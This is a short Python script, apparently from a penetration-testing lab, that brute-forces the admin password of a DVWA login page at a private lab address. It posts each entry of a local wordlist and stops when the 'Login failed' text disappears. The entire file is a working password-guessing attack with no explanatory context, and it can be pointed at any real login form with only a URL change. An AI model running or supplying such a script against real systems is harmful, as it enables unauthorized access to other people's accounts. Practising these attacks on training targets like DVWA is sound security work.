import requests

target_url = "http://172.16.124.4/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "login": "submit"}

with open("/home/kali/Downloads/passwords.txt", "r") as wordlist_file:
	for line in wordlist_file:
		word = line.strip()
		data_dict["password"] = word
		response = requests.post(target_url, data=data_dict)
		if "Login failed" not in response.content.decode():
			print("[+] Got the password --> " + word)
			exit()

print("[+] Reached end of line.")